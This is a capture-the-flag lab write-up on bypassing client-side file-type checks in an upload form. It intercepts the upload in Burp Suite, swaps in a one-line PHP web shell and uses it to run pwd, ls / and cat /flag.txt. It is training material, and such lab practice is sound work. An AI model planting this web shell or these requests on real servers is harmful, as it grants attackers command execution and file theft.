# Client-Side Validation

Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)

This lab has some protection features reagarding file uploading.

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

Find an image to upload and use Burp Suite to capture the upload POST request.

<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

Now lets change the value of the filename parameter to shell.php and add the following line of code like shown in the image above:

```php
<?php system($_REQUEST['cmd']); ?>
```

After we foward the request, and have the confirmation that the file was uploaded successfully, lets find out where the file is located.

<figure><img src="../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

Go to the main page of the web application, and use the Inspector. We can see that our shell is under the `profiles_images` directory.

So lets follow the destination of the file and add our command:

```bash
/profile_images/shell.php?cmd=pwd
```

<figure><img src="../../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

And its working!

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

Then we list the root directory to confirm the flag location:

```bash
/profile_images/shell.php?cmd=ls /
```

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

And we retrieve the flag!

```bash
/profile_images/shell.php?cmd=cat /flag.txt
```

